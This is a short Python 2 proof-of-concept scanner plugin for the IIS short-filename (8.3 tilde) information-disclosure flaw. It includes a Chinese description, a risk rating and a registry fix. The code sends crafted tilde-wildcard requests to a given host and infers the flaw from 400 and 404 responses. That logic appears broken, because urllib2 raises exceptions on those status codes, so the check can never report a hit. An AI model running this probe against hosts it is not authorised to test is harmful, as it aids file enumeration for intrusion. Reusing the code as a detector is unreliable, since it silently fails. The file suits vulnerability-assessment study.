#!/usr/bin/env python
# -*- coding:utf-8 -*-

'''
    name: IIS短文件名
    info: 攻击者可利用此特性猜解出目录与文件名，以达到类似列目录漏洞的效果。
    level: 低危
    type: 信息泄露
    repair: 修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1，重启服务器。
'''

import urllib2
from POC_Framework import POC

class myPOC(POC):
    
    #单IP的POC
    def check(self, ip, port, timeout=5):
        try:
            url = ip + ":" + str(port)
            flag_400 = '/otua*~1.*/.aspx'
            flag_404 = '/*~1.*/.aspx'
            request = urllib2.Request('http://' + url + flag_400)
            req = urllib2.urlopen(request, timeout=timeout)
            if int(req.code) == 400:
                req_404 = urllib2.urlopen('http://' + url + flag_404, timeout=timeout)
                if int(req_404.code) == 404:
                    return True
        except:
            return False

if __name__ == "__main__":

    Check_POC = myPOC()
    Check_POC.run()